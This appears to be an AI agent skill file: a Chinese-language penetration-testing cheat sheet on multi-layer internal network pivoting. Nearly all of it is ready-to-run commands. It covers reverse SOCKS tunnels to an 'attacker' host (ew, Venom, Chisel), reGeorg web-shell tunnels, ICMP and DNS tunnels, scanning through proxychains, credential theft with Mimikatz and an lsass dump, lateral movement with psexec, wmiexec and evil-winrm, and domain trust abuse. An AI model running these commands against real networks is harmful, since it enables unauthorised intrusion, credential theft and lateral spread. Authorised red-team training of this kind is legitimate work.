---
name: network-pivoting
description: Use when encountering 多层内网渗透技术 - 代理搭建、隧道技术、域间信任利用
---

# 多层网络渗透

## Info

- **Domain**: pentest
- **Tags**: network, tunnel, proxy, pivoting, lateral

## 代理技术

### 1. 正向代理
```bash
# SSH隧道
ssh -D 1080 user@jumpserver  # SOCKS代理
ssh -L 8080:target:80 user@jumpserver  # 本地端口转发
ssh -R 8080:localhost:80 user@jumpserver  # 远程端口转发

# frp
[common]
bind_port = 7000

[socks5]
type = tcp
remote_port = 1080
plugin = socks5
```

### 2. 反向代理
```bash
# 反向SOCKS
# 攻击机
./ew -s rcsocks -l 1080 -e 8888

# 目标机
./ew -s rssocks -d attacker -e 8888

# 或使用 Venom
admin.exe -l 8888
agent.exe -r attacker:8888
```

### 3. 多级代理
```bash
# Chisel多级代理
# 第一层
./chisel server -p 7000 --reverse

# 第二层
./chisel client attacker:7000 R:1080:socks

# 使用代理
proxychains nmap -sT 10.10.10.0/24
```

## 常用工具

### CS/MSF代理
```bash
# Cobalt Strike
# 1. 创建 SOCKS代理
# 2. View -> Proxy Pivots -> SOCKS Server

# Metasploit
run autoroute -s 10.10.10.0/24
use auxiliary/server/socks4a
set SRVPORT 1080
run
```

### reGeorg
```bash
# 上传 tunnel.jsp/tunnel.php
python reGeorgSocksProxy.py -u http://target/tunnel.jsp -p 1080
```

### Neo-reGeorg
```bash
python neoreg.py generate -k password
python neoreg.py -u http://target/tunnel.php -k password -p 1080
```

## 隧道技术

### ICMP隧道
```bash
# ptunnel
# 服务端
ptunnel -x password

# 客户端
ptunnel -p target -lp 1080 -da 127.0.0.1 -dp 22 -x password

# icmptunnel
# 服务端
icmptunnel -s

# 客户端
icmptunnel -c target
```

### DNS隧道
```bash
# dnscat2
# 服务端
ruby dnscat2.rb domain.com

# 客户端
./dnscat2 domain.com

# iodine
# 服务端
iodined -f -c -P password 10.0.0.1 domain.com

# 客户端
iodine -f -P password domain.com
```

### HTTP隧道
```bash
# reDuh
java -jar reDuhClient.jar http://target/reDuh.jsp

# ABPTTS
python abptts.py -c config.txt -u http://target/abptts.aspx
```

## 多层内网扫描

### 主机发现
```bash
# 通过代理扫描
proxychains nmap -sT -Pn 10.10.10.0/24 -p 445

# 内网存活探测
for i in $(seq 1 254); do
  ping -c 1 10.10.10.$i &>/dev/null && echo "10.10.10.$i alive"
done
```

### 端口扫描
```bash
# 快速扫描常用端口
proxychains nmap -sT -Pn -F 10.10.10.10

# 详细扫描
proxychains nmap -sT -Pn -sV -O 10.10.10.10
```

### 服务识别
```bash
# SMB
proxychains crackmapexec smb 10.10.10.0/24

# RDP
proxychains nmap -sT -Pn -p 3389 10.10.10.0/24

# Web
proxychains curl -I http://10.10.10.10
```

## 横向移动

### 凭据收集
```bash
# Mimikatz
privilege::debug
sekurlsa::logonpasswords

# LaZagne
lazagne.exe all

# Procdump + Mimikatz
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### 横向方式
```bash
# PsExec
psexec.py domain/user:password@target

# WMI
wmiexec.py domain/user:password@target

# WinRM
evil-winrm -i target -u user -p password

# SMB
smbexec.py domain/user:password@target

# DCOM
dcomexec.py domain/user:password@target
```

## 域间信任

### 跨域攻击
```bash
# 枚举域信任
nltest /domain_trusts
netdom trust /domain:child.domain.com

# SID History利用
# 获取子域管理员SID
# 添加到子域用户的SIDHistory
# 访问父域资源
```

### 林信任
```bash
# 跨林攻击
# 1. 获取林信任信息
# 2. 枚举目标林用户
# 3. 利用信任关系横向
```

## 全局编录攻击
```bash
# 枚举GC
nltest /dsgetdc:domain.com /gc

# 通过GC查询
# 可以跨域查询所有用户信息
```